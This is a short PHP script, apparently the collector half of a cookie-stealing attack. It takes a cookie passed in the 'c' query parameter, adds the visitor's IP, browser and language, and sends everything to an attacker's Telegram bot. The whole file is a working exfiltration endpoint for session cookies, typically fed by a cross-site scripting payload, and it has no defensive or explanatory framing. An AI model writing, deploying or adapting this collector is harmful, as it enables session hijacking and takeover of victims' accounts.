<?php
require('telegramapi.php');
require('config.php');

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$accept=$_SERVER['HTTP_ACCEPT_LANGUAGE'];
$cookie = $_GET['c'];
$today = date("l, F j, Y, g:i a") ;
$script_url = $_SERVER['SCRIPT_URI'];
echo $script_url;


$message = "
Ip: $ip\n
Cookie: $cookie\n
Browser: $userAgent\n
Lingua: $accept\n
Url: $base\n
Giorno & Ora : $today \n
";

echo $message;
sm($bot_admin_id, $message);
sendMessage($bot_admin_id, $message);
?>